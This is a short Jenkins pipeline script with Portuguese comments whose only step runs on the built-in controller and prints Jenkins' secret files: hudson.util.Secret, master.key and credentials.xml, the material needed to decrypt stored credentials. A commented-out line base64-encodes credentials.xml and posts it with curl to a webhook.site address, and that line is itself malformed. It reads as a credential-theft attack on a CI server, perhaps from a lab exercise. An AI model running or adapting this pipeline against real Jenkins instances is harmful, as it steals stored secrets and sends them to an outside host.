pipeline {
    agent {
        label '(built-in)'
    }
    stages {               // conjunto de etapas
        stage('Nome') {    // uma etapa específica
            steps {        // ações dentro da etapa
                sh '''
                whoami
                pwd
                ls -lath /var/jenkins_home
                ls -lath /var/jenkins_home/secrets
                cat ../../secrets/hudson.util.Secret
                cat ../../secrets/master.key
                cat ../../credentials.xml
                #echo /var/jenkins_home/credentials.xml |base64 | | curl -X POST -d @- https://webhook.site/731aa854-74cb-47f6-8163-b9185f68f89f
                '''
            }
        }
    }
}
